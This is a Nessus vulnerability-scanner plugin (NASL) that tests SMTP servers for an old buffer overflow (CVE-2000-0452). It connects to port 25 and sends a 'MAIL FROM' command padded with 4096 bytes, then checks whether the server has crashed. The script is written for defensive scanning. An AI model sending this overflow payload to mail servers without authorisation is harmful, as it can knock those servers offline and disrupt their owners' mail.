#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# See also:
# From: "K. K. Mookhey" <cto@nii.co.in>
# To: full-disclosure@lists.netsys.com, vulnwatch@vulnwatch.org, 
#  bugtraq@securityfocus.com
# Date: Mon, 11 Nov 2002 13:55:04 +0530
# Subject: Buffer Overflow in iSMTP Gateway
#
# http://www.securityfocus.com/bid/153
# SLMail 3.0.2421 Buffer Overflow 'Mail From' Vulnerability
#

if(description)
{
 script_id(10419);
 script_bugtraq_id(1229, 153);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0452");
 
 name["english"] = "Lotus MAIL FROM overflow";
 name["francais"] = "Dépassement de buffer dans Lotus suite à la commande MAIL FROM";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
There seem to be a buffer overflow in the remote SMTP server
when the server is issued a too long argument to the 'MAIL FROM'
command, such as :

	MAIL FROM: nessus@AAAAA....AAAAA

This problem may allow an attacker to prevent this host
to act as a mail host and may even allow him to execute
arbitrary code on this system.


Solution : Inform your vendor of this vulnerability
and wait for a patch.

Risk factor : High";


 desc["francais"] = "
Il semble y avoir un dépassement de buffer dans le
serveur SMTP distant lorsque celui-ci reçoit un
argument trop long a la commande 'MAIL FROM' tel
que :

	MAIL FROM: nessus@AAAAAA....AAAAA

Ce problème peut permettre à un pirate d'empecher
cette machine d'agir comme un serveur de mail, et
peut meme lui permettre d'executer du code arbitraire
sur ce système.


Solution : Informez votre vendeur de cette vulnérabilité et 
attendez un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "Overflows a buffer in the remote mail server"; 
 summary["francais"] = "Dépassemement de buffer dans le serveur de mail distant";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 if ( ! data ) exit(0);
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if("250 " >< data)
 {
 crp = string("MAIL FROM: nessus@", crap(4096), "\r\n");
 send(socket:soc, data:crp);
 buf = recv_line(socket:soc, length:1024);
 }
 close(soc);
 
 soc = open_sock_tcp(port);
 if(soc)
 {
 r = smtp_recv_banner(socket:soc);
 }
  else r = 0;
 if(!r)security_hole(port);
 }
}
